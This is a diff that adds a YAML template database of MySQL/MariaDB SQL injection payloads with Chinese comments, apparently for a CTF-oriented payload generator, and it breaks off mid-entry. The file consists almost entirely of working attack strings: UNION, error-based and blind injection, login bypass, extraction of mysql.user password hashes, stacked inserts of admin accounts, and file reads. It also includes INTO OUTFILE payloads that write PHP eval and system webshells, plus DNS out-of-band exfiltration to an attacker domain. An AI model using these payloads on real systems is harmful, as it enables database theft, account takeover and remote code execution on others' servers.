@@ -1,0 +1,790 @@
+ruleDB: v0.1.0
+# MySQL / MariaDB SQL 注入模板。
+# id 前缀 sqli.mysql.* 与"按漏洞类型分目录、文件名即 id 前缀"的约定一致。
+
+templates:
+  # ---- 联合查询（带槽位）----
+
+  - id: sqli.mysql.union.basic
+    name: MySQL UNION 联合查询
+    desc: 基础联合查询，需要页面有回显位
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mysql, mariadb]
+    version: ">=5.0"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      comment: {options: ["-- -", "#", "/**/"], default: "-- -"}
+    body: "<<close>> UNION SELECT <<select(cols,pos)>> <<comment>>"
+    requires: [echo]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: sqli.mysql.union.orderby
+    name: MySQL ORDER BY 猜列数
+    desc: 递增序号定位列数，报错点即列数
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mysql, mariadb]
+    version: ">=5.0"
+    slots:
+      close:   {options: ["'", '"', "')", '")', ""], default: "'"}
+      n:       {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "5"}
+      comment: {options: ["-- -", "#", "/**/"], default: "-- -"}
+    body: "<<close>> ORDER BY <<n>> <<comment>>"
+    requires: []
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: sqli.mysql.union.marker
+    name: MySQL UNION 回显位标记
+    desc: 在回显位放一个固定标记，用来在页面上定位回显点
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mysql, mariadb]
+    version: ">=5.0"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      marker: {options: ["0x41", "'ab'", "'a b'"], default: "0x41"}
+      comment: {options: ["-- -", "#", "/**/"], default: "-- -"}
+    body: "<<close>> UNION SELECT <<select(cols,pos,marker)>> <<comment>>"
+    vars: []
+    requires: [echo]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: sqli.mysql.union.version
+    name: MySQL UNION 版本回显
+    desc: 联合查询回显数据库版本
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mysql, mariadb]
+    version: ">=5.0"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      expr:   {options: ["@@version", "database()", "user()", "current_user()"], default: "@@version"}
+      comment: {options: ["-- -", "#", "/**/"], default: "-- -"}
+    body: "<<close>> UNION SELECT <<select(cols,pos,expr)>> <<comment>>"
+    requires: [echo]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: sqli.mysql.union.tables
+    name: MySQL UNION 读表名
+    desc: 从 information_schema 读当前库的表名
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mysql, mariadb]
+    version: ">=5.0"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      expr:   {options: ["group_concat(table_name)", "group_concat(table_name,0x7c)"], default: "group_concat(table_name)"}
+      # 以前 WHERE 子句整句写死成 table_schema=database()，要读别的库只能改数据文件。
+      # 整句做成槽位（而不是只把库名做成变量）：因为「不限库」这一档根本没有库名可填。
+      # 空格放在子句**里面**，这样「不限库」那一档不会在 SQL 里留下多余空白。
+      where:
+        options:
+          - {id: current, name: "当前库",            clause: " WHERE table_schema=database()"}
+          - {id: named,   name: "指定库名（填 db）",  clause: " WHERE table_schema='<<db>>'"}
+          - {id: mysql,   name: "mysql 库",          clause: " WHERE table_schema='mysql'"}
+          - {id: any,     name: "不限库（列出全部）", clause: ""}
+        default: current
+      comment: {options: ["-- -", "#", "/**/"], default: "-- -"}
+    body: "<<close>> UNION SELECT <<select(cols,pos,expr)>> FROM information_schema.tables<<where.clause>> <<comment>>"
+    vars: [db]
+    requires: [echo]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  # ---- 变量型（自由文本）----
+
+  - id: sqli.mysql.union.expr
+    name: MySQL UNION 自定义回显表达式
+    desc: 回显列由用户填任意 SQL 表达式
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mysql, mariadb]
+    version: ">=5.0"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      comment: {options: ["-- -", "#", "/**/"], default: "-- -"}
+    body: "<<close>> UNION SELECT <<select(cols,pos,expr)>> <<comment>>"
+    vars: [expr]
+    requires: [echo]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  # ---- 报错注入 ----
+
+  - id: sqli.mysql.error.extractvalue
+    name: MySQL extractvalue 报错注入
+    desc: 适用于 MySQL 5.1+，需要页面回显数据库报错
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mysql, mariadb]
+    version: ">=5.1 <5.7.9"
+    slots:
+      close:   {options: ["'", '"', "')", '")', ""], default: "'"}
+      comment: {options: ["-- -", "#", "/**/"], default: "-- -"}
+    body: "<<close>> AND extractvalue(1,concat(0x7e,(<<expr>>),0x7e)) <<comment>>"
+    vars: [expr]
+    requires: [error]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: sqli.mysql.error.updatexml
+    name: MySQL updatexml 报错注入
+    desc: 适用于 MySQL 5.1.5+
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mysql, mariadb]
+    version: ">=5.1.5"
+    slots:
+      close:   {options: ["'", '"', "')", '")', ""], default: "'"}
+      comment: {options: ["-- -", "#", "/**/"], default: "-- -"}
+    body: "<<close>> AND updatexml(1,concat(0x7e,(<<expr>>),0x7e),1) <<comment>>"
+    vars: [expr]
+    requires: [error]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  # ---- 盲注 ----
+
+  - id: sqli.mysql.bool.blind
+    name: MySQL 布尔盲注
+    desc: 页面不报错但真/假条件返回不同
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mysql, mariadb]
+    version: ">=5.0"
+    slots:
+      close:   {options: ["'", '"', "')", '")', ""], default: "'"}
+      comment: {options: ["-- -", "#", "/**/"], default: "-- -"}
+    body: "<<close>> AND (<<cond>>) <<comment>>"
+    vars: [cond]
+    requires: [boolean]
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: sqli.mysql.time.sleep
+    name: MySQL 时间盲注 SLEEP
+    desc: 页面无回显无差异时用延时判断
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mysql, mariadb]
+    version: ">=5.0"
+    slots:
+      close:   {options: ["'", '"', "')", '")', ""], default: "'"}
+      comment: {options: ["-- -", "#", "/**/"], default: "-- -"}
+    body: "<<close>> AND IF((<<cond>>),SLEEP(5),0) <<comment>>"
+    vars: [cond]
+    requires: []
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: sqli.mysql.time.benchmark
+    name: MySQL 时间盲注 BENCHMARK
+    desc: SLEEP 不可用时的替代
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mysql, mariadb]
+    version: ">=4.1"
+    slots:
+      close:   {options: ["'", '"', "')", '")', ""], default: "'"}
+      comment: {options: ["-- -", "#", "/**/"], default: "-- -"}
+    body: "<<close>> AND IF((<<cond>>),BENCHMARK(5000000,MD5(1)),0) <<comment>>"
+    vars: [cond]
+    requires: []
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  # ---- 堆叠 / 带外 ----
+
+  - id: sqli.mysql.stacked
+    name: MySQL 堆叠注入
+    desc: 需要驱动支持多语句（如 mysqli::multi_query）
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mysql, mariadb]
+    version: ">=5.0"
+    slots:
+      close: {options: ["'", '"', "')", '")', ""], default: "'"}
+    body: "<<close>>; <<stmt>>"
+    vars: [stmt]
+    requires: [stacked]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  - id: sqli.mysql.oob.dns
+    name: MySQL 带外 DNS
+    desc: Windows 下 load_file 触发 UNC 请求
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mysql, mariadb]
+    version: ">=5.0"
+    slots:
+      close:   {options: ["'", '"', "')", '")', ""], default: "'"}
+      comment: {options: ["-- -", "#", "/**/"], default: "-- -"}
+    body: "<<close>> UNION SELECT load_file(concat('\\\\\\\\',(<<expr>>),'.<<domain>>\\\\a')) <<comment>>"
+    vars: [expr, domain]
+    requires: [outbound, os-windows, file-priv, listener]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-17
+
+  # ---- 文件读写 ----
+
+  - id: sqli.mysql.file.read
+    name: MySQL 读文件
+    desc: 需要 FILE 权限且 secure_file_priv 允许
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mysql, mariadb]
+    version: ">=5.0"
+    slots:
+      close:   {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:     {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      comment: {options: ["-- -", "#", "/**/"], default: "-- -"}
+    # 列清单由 <<select>> 生成：以前这里把回显位写死在第一位（`,2,3`），
+    # 目标回显在第 2 位就只能手改。现在和其他 UNION 模板一样认 cols/pos。
+    body: "<<close>> UNION SELECT <<select(cols,pos,load_file('<<filepath>>'))>> <<comment>>"
+    vars: [filepath]
+    requires: [file-priv]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 认证绕过 ----
+
+  - id: sqli.mysql.auth.bypass
+    name: MySQL 登录绕过
+    desc: 经典永真条件绕过，无槽位
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mysql, mariadb]
+    version: ">=5.0"
+    slots:
+      # 闭合符由注入点的上下文决定（`'` / `")` / 无引号），不是模板能替你猜的
+      close:   {options: ["'", '"', "')", '") ', ""], default: "'"}
+      comment: {options: ["-- -", "#", "/**/"], default: "-- -"}
+    body: "<<close>> OR 1=1 <<comment>>"
+    requires: []
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.mysql.auth.bypass.admin
+    name: MySQL 指定用户登录绕过
+    desc: 已知用户名时的绕过。用户名默认 admin，按目标实际账号改
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mysql, mariadb]
+    version: ">=5.0"
+    slots:
+      username: {options: ["admin", "administrator", "root", "sa", "test", "guest"],
+                 default: "admin"}
+      close:    {options: ["'", '"', "')", '") ', ""], default: "'"}
+      comment:  {options: ["-- -", "#", "/**/"], default: "-- -"}
+    body: "<<username>><<close>> <<comment>>"
+    vars: []
+    requires: [recon]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 信息收集（补齐 tables 之外的几条）----
+  # 联合注入拿数据是「库名 → 表名 → 列名 → 数据」四步，原来只有「表名」那一步。
+  # 少的那几步在 CTF 里恰恰是每道题都要走的。
+
+  - id: sqli.mysql.union.databases
+    name: MySQL 读库名
+    desc: 把当前账号能看见的库名一次列出来，再决定打哪个库
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mysql, mariadb]
+    version: ">=5.0"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      expr:   {options: ["group_concat(schema_name)", "group_concat(schema_name,0x7c)",
+                         "database()"],
+               default: "group_concat(schema_name)"}
+      comment: {options: ["-- -", "#", "/**/"], default: "-- -"}
+    body: "<<close>> UNION SELECT <<select(cols,pos,expr)>> FROM information_schema.schemata <<comment>>"
+    requires: [echo]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.mysql.union.columns
+    name: MySQL 读列名
+    desc: 已知表名后读它的列名。table_name 是字符串比较，目标表名填进 <<table>>
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mysql, mariadb]
+    version: ">=5.0"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      expr:   {options: ["group_concat(column_name)", "group_concat(column_name,0x7c)"],
+               default: "group_concat(column_name)"}
+      comment: {options: ["-- -", "#", "/**/"], default: "-- -"}
+    body: "<<close>> UNION SELECT <<select(cols,pos,expr)>> FROM information_schema.columns WHERE table_name='<<table>>' <<comment>>"
+    vars: [table]
+    requires: [echo, recon]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.mysql.union.dump
+    name: MySQL 读列数据
+    desc: 已知表名与列名后把整列拉出来。0x7c 是竖线分隔符，避免和值里的逗号混淆
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mysql, mariadb]
+    version: ">=5.0"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      expr:   {options: ["group_concat(<<col>>)", "group_concat(<<col>>,0x7c)",
+                         "concat_ws(0x7c,<<col>>)"],
+               default: "group_concat(<<col>>,0x7c)"}
+      comment: {options: ["-- -", "#", "/**/"], default: "-- -"}
+    # 第三个参数里的 <<col>> 会被变量替换阶段接着求值——槽位先填、变量后替换，
+    # 所以槽位选项里可以安全地嵌变量占位符。
+    body: "<<close>> UNION SELECT <<select(cols,pos,expr)>> FROM <<table>> <<comment>>"
+    vars: [col, table]
+    requires: [echo, recon]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.mysql.union.user
+    name: MySQL 读账号密码哈希
+    desc: 需要能读 mysql 库的权限。5.7 起哈希列叫 authentication_string，更早叫 password
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mysql, mariadb]
+    version: ">=5.0"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      hashcol: {options: ["authentication_string", "password"], default: "authentication_string"}
+      comment: {options: ["-- -", "#", "/**/"], default: "-- -"}
+    body: "<<close>> UNION SELECT <<select(cols,pos,concat(user,0x3a,<<hashcol>>))>> FROM mysql.user <<comment>>"
+    requires: [echo]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 报错注入（补齐三类）----
+
+  - id: sqli.mysql.error.floor
+    name: MySQL floor 报错注入
+    desc: 最经典的一条。靠 GROUP BY 主键冲突把值带进报错，输出长度不受 extractvalue 的 32 字符限制
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mysql, mariadb]
+    version: ">=5.0"
+    slots:
+      close:   {options: ["'", '"', "')", '") ', ""], default: "'"}
+      comment: {options: ["-- -", "#", "/**/"], default: "-- -"}
+    # information_schema.tables 必须至少有 3 行，否则 RAND 的重复键触发不出来——
+    # 这个库在任何 MySQL 上都够大，所以固定用它当「够长的表」。
+    body: "<<close>> AND (SELECT 1 FROM (SELECT COUNT(*),CONCAT(0x7e,(<<expr>>),0x7e,FLOOR(RAND(0)*2))x FROM information_schema.tables GROUP BY x)a) <<comment>>"
+    vars: [expr]
+    requires: [error]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.mysql.error.exp
+    name: MySQL EXP 报错注入
+    desc: 5.5.5 起可用。extractvalue / updatexml 被过滤时的一条替代路径
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mysql, mariadb]
+    version: ">=5.5.5"
+    slots:
+      close:   {options: ["'", '"', "')", '") ', ""], default: "'"}
+      comment: {options: ["-- -", "#", "/**/"], default: "-- -"}
+    # 取反后喂给 EXP，溢出成 DOUBLE 上界，报错信息里带出子查询的结果
+    body: "<<close>> AND EXP(~(SELECT * FROM (SELECT (<<expr>>))a)) <<comment>>"
+    vars: [expr]
+    requires: [error]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.mysql.error.geometry
+    name: MySQL 几何函数报错注入
+    desc: 5.7 / 8.0 上 extractvalue 与 updatexml 都被移除时的主力。老版本没有这几个函数，用不了
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mysql, mariadb]
+    version: ">=5.7"
+    slots:
+      close:   {options: ["'", '"', "')", '") ', ""], default: "'"}
+      func:    {options: ["geometrycollection", "multipoint", "polygon", "linestring",
+                          "multilinestring", "multipolygon"],
+                default: "geometrycollection"}
+      comment: {options: ["-- -", "#", "/**/"], default: "-- -"}
+    body: "<<close>> AND <<func>>((SELECT * FROM (SELECT (<<expr>>))a)) <<comment>>"
+    vars: [expr]
+    requires: [error]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.mysql.error.nocolumn
+    name: MySQL 无列名注入
+    desc: 列名读不到（information_schema 被拦）时，用派生表把目标表的列**按位置**编号，用 `2` 这样的数字名引用它。需要先知道目标表有几列
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mysql, mariadb]
+    version: ">=5.0"
+    slots:
+      # 派生表的列名来自第一个 SELECT 的表达式：`SELECT 1,2,3 UNION SELECT * FROM t`
+      # 造出的表，列名就是 `1` `2` `3`——于是不用知道真实列名也能按位置取值。
+      # 种子列表必须与目标表的列数**严格相等**，所以列数和列表绑在一个槽位里选。
+      t:
+        options:
+          - {id: n2,  name: "目标表 2 列",  seed: "1,2"}
+          - {id: n3,  name: "目标表 3 列",  seed: "1,2,3"}
+          - {id: n4,  name: "目标表 4 列",  seed: "1,2,3,4"}
+          - {id: n5,  name: "目标表 5 列",  seed: "1,2,3,4,5"}
+          - {id: n10, name: "目标表 10 列", seed: "1,2,3,4,5,6,7,8,9,10"}
+        default: n3
+      # 必须覆盖 t 里最大的那档：t 给到 10 列而这里只到 5，目标 6~10 列时
+      # 用户选不出要提取的列，只能去改数据文件。两个槽位是耦合的，一起改。
+      colidx:  {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "2"}
+      close:   {options: ["'", '"', "')", '") ', ""], default: "'"}
+      comment: {options: ["-- -", "#", "/**/"], default: "-- -"}
+    body: "<<close>> AND extractvalue(1,concat(0x7e,(SELECT group_concat(`<<colidx>>`) FROM (SELECT <<t.seed>> UNION SELECT * FROM <<table>>)x),0x7e)) <<comment>>"
+    vars: [table]
+    requires: [error, recon]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 写文件 / 读客户端文件 ----
+
+  - id: sqli.mysql.union.outfile
+    name: MySQL INTO OUTFILE 写 webshell
+    desc: FILE 权限 + secure_file_priv 为空 + 有可写 Web 路径，三个条件缺一不可。目标路径必须是不存在的文件，INTO OUTFILE 不会覆盖已有文件
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mysql, mariadb]
+    version: ">=5.0"
+    slots:
+      close:  {options: ["'", '"', "')", '") ', ""], default: "'"}
+      cols:   {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "3"}
+      pos:    {options: ["1", "2", "3", "4", "5", "6", "7", "8", "9", "10"], default: "1"}
+      code:   {options: ["<?php @eval($_POST[1]);?>", "<?php system($_GET[c]);?>",
+                         "<?php echo 'pwn';?>"],
+               default: "<?php @eval($_POST[1]);?>"}
+      comment: {options: ["-- -", "#", "/**/"], default: "-- -"}
+    # 引号写在 body 里、包住 <<code>>：槽位描述的是「写进去什么代码」，
+    # SQL 的字面量语法属于模板。写成 <<select(cols,pos,code)>> 的话，
+    # 槽位的值会被原样插进列清单，出来一个没有引号的 `SELECT <?php ...?>,2,3`
+    body: "<<close>> UNION SELECT <<select(cols,pos,'<<code>>')>> INTO OUTFILE '<<filepath>>' <<comment>>"
+    vars: [filepath]
+    requires: [file-priv, writable]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.mysql.file.read.load_data
+    name: MySQL 恶意服务端读客户端文件
+    desc: 方向反过来：让应用连到攻击者自己起的 MySQL 服务端，由服务端回一个 LOAD DATA LOCAL INFILE，把**应用服务器**上的文件读回来。这是客户端侧漏洞，与服务端配置无关
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mysql, mariadb]
+    version: ">=5.0"
+    slots:
+      close: {options: ["'", '"', "')", '") ', ""], default: "'"}
+    # 这条载荷的角色和其他模板不同：它是**攻击者服务端要回给应用的应答**，
+    # 不是打进注入点的串。放在这里是因为它同样是「MySQL 语法写的一句话」，
+    # 而且 CTF 里常和 SSRF / 数据库连接串可控配合出现。
+    body: "<<close>>; LOAD DATA LOCAL INFILE '<<filepath>>' INTO TABLE <<table>> FIELDS TERMINATED BY '\\n'--"
+    vars: [filepath, table]
+    requires: [stacked, outbound, listener]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 堆叠 ----
+
+  - id: sqli.mysql.stacked.insert
+    name: MySQL 堆叠插入数据
+    desc: 支持多语句时直接改库——CTF 里最常用来插一个管理员账号
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mysql, mariadb]
+    version: ">=5.0"
+    slots:
+      close: {options: ["'", '"', "')", '") ', ""], default: "'"}
+    body: "<<close>>; INSERT INTO <<table>> (<<fields>>) VALUES (<<values>>)--"
+    vars: [table, fields, values]
+    requires: [stacked]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 时间盲注的补充形态 ----
+
+  - id: sqli.mysql.time.sleep.plain
+    name: MySQL 无条件延时
+    desc: 先用它确认注入点存在（响应稳定地慢 N 秒），再换成带条件的 IF 版本逐字符猜
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mysql, mariadb]
+    version: ">=5.0"
+    slots:
+      close:   {options: ["'", '"', "')", '") ', ""], default: "'"}
+      secs:    {options: ["3", "5", "10"], default: "5"}
+      comment: {options: ["-- -", "#", "/**/"], default: "-- -"}
+    body: "<<close>> AND SLEEP(<<secs>>) <<comment>>"
+    vars: []
+    requires: []
+    status: golden
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.mysql.time.sleep.subquery
+    name: MySQL 延时盲注（子查询形态）
+    desc: SLEEP 直接写在 AND 后面被 WAF 拦时，塞进派生表里绕
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mysql, mariadb]
+    version: ">=5.0"
+    slots:
+      close:   {options: ["'", '"', "')", '") ', ""], default: "'"}
+      secs:    {options: ["3", "5", "10"], default: "5"}
+      comment: {options: ["-- -", "#", "/**/"], default: "-- -"}
+    body: "<<close>> AND (SELECT 1 FROM (SELECT SLEEP(<<secs>>))x) <<comment>>"
+    vars: []
+    requires: []
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 报错注入的其余几条路（extractvalue / updatexml / floor / exp / 几何函数之外）----
+  # 这几条的价值在于「换一条路」：被过滤、被 WAF 拦、或者目标升到 8.0 之后，
+  # 原来那条不通了，而每一条的版本限制和触发条件各不相同。
+
+  - id: sqli.mysql.error.name_const
+    name: MySQL NAME_CONST 报错注入
+    desc: NAME_CONST 拿第一个参数当列名，同一个 SELECT 里出现两次就撞出 Duplicate column name，值跟着报错出来。在 5.0.x 上确认可用；5.1 起 NAME_CONST 要求参数是常量，传内置函数能不能过没有定论——报 Incorrect arguments to NAME_CONST 就是这条路在本机不通，换 GTID_SUBSET 那条。带出的值上限 64 字节
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mysql, mariadb]
+    version: ">=5.0"
+    slots:
+      close:   {options: ["'", '"', "')", '") ', ""], default: "'"}
+      comment: {options: ["-- -", "#", "/**/"], default: "-- -"}
+    body: "<<close>> AND (SELECT * FROM (SELECT NAME_CONST((<<expr>>),1),NAME_CONST((<<expr>>),1))x) <<comment>>"
+    vars: [expr]
+    requires: [error]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.mysql.error.gtid_subset
+    name: MySQL GTID_SUBSET 报错注入
+    desc: GTID 系列函数收到不是 GTID 的串会报 Malformed GTID set specification，值跟在报错里出来。extractvalue / updatexml 被过滤时的一条替代；不需要打开 GTID 复制，它就是个普通字符串函数。报错长度上限约 200 字符，超了要分段取（MariaDB 的 GTID 实现不同，不保证有这对函数）
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mysql]
+    version: ">=5.6.5"
+    slots:
+      close:   {options: ["'", '"', "')", '") ', ""], default: "'"}
+      comment: {options: ["-- -", "#", "/**/"], default: "-- -"}
+    body: "<<close>> AND GTID_SUBSET(CONCAT(0x7e,(<<expr>>),0x7e),1) <<comment>>"
+    vars: [expr]
+    requires: [error]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.mysql.error.json_keys
+    name: MySQL JSON_KEYS 报错注入
+    desc: 5.7 独有的报错路径——5.7 的非法 JSON 报错（3141）末尾会带出 in '<值>'，值就漏在那儿；8.0 把这个尾巴去掉了，同一条载荷只剩一个字符位置可看，**别在 8.0 上指望它**。JSON 函数 5.7.8 起才有
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mysql]
+    version: ">=5.7.8 <8.0"
+    slots:
+      close:   {options: ["'", '"', "')", '") ', ""], default: "'"}
+      comment: {options: ["-- -", "#", "/**/"], default: "-- -"}
+    body: "<<close>> AND JSON_KEYS(CONCAT(0x7e,(<<expr>>),0x7e)) <<comment>>"
+    vars: [expr]
+    requires: [error]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  - id: sqli.mysql.error.procedure_analyse
+    name: MySQL PROCEDURE ANALYSE 报错注入
+    desc: 注入点落在语句**收尾处**（后面再没有 WHERE / ORDER BY / LIMIT）时用。不需要 AND 或 UNION 就能触发报错，extractvalue 藏在 PROCEDURE ANALYSE 的参数里，只按关键字位置拦的规则容易放过；5.7.18 起标记废弃、8.0 已移除，8.0 上是语法错误，换别的报错路径
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mysql, mariadb]
+    version: ">=5.1.5 <8.0"
+    slots:
+      close:   {options: ["'", '"', "')", '") ', ""], default: "'"}
+      comment: {options: ["-- -", "#", "/**/"], default: "-- -"}
+    body: "<<close>> PROCEDURE ANALYSE(EXTRACTVALUE(1,CONCAT(0x7e,(<<expr>>),0x7e)),1) <<comment>>"
+    vars: [expr]
+    requires: [error]
+    status: lab
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 不写 SELECT 也能读表 ----
+
+  - id: sqli.mysql.handler.read
+    name: MySQL HANDLER 读表
+    desc: SELECT 被关键字过滤整条拦掉、UNION 也用不了时的替代路径。HANDLER 是按行读表的独立语句，只能堆叠执行。关键约束：**HANDLER 的游标状态不跨请求**，所以 OPEN → READ FIRST → 若干次 READ NEXT → CLOSE 必须在同一个批次里发完，n 就是「除首行外再多读几行」。结果是结果集，应用得肯把多余的结果集渲染出来
+    vuln: [sqli]
+    content_type: [sql-expression]
+    component: [mysql, mariadb]
+    version: ">=5.0"
+    slots:
+      close: {options: ["'", '"', "')", '") ', ""], default: "'"}
+      # 除首行外再多读几行；0 就是只要第一行
+      n:     {options: ["0", "1", "2", "3", "5"], default: "2"}
+      comment: {options: ["-- -", "#", "/**/"], default: "-- -"}
+    # READ NEXT 那几段由 <<rep>> 展开——重复次数本身就是个要按目标调的取值。
+    # 展开结果里的 <<table>> 走后面的变量替换，所以这里能嵌占位符。
+    # 分号后面**不能加空格**：<<rep>> 的 item 会先 strip()，末尾的空格留不住。
+    # 好在分号本身就是语句分隔符，MySQL 不要求它后面跟空白（`;SELECT 1` 合法）
+    body: "<<close>>;HANDLER <<table>> OPEN;HANDLER <<table>> READ FIRST;<<rep(n,HANDLER <<table>> READ NEXT;)>>HANDLER <<table>> CLOSE; <<comment>>"
+    vars: [table]
+    requires: [stacked, recon]
+    status: theory
+    source: 手写
+    license: ""
+    updated: 2026-09-18
+
+  # ---- 写文件：DUMPFILE 与 OUTFILE 的分工 ----
+
+  - id: sqli.mysql.file.write.dumpfile
+    name: MySQL INTO DUMPFILE 写文件
+    desc: 与 INTO OUTFILE 的唯一区别是**不转义、不加行尾换行**——写二进制或单行内容时用它，写文本马用 OUTFILE 那条。内容用 0x 十六进制串表示，绕开引号与转义问题。前提同样是 FILE 权限、secure_file_priv 允许、目标文件不存在
+    vuln: [sqli]
+    content_type: [sql-expression]
